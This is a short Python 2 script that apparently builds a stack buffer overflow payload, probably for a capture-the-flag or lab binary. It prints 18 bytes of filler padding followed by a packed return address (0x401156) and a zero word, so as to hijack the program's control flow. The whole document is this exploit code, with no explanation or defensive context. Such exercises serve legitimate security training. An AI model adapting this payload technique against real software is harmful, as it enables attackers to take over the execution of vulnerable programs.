import struct
padding = "AAAABBBBCCCCDDDDEE"
ret_addr1 = struct.pack('I', 0x401156)
ret_addr2 = struct.pack('I', 0x0000)
print padding + ret_addr1 + ret_addr2
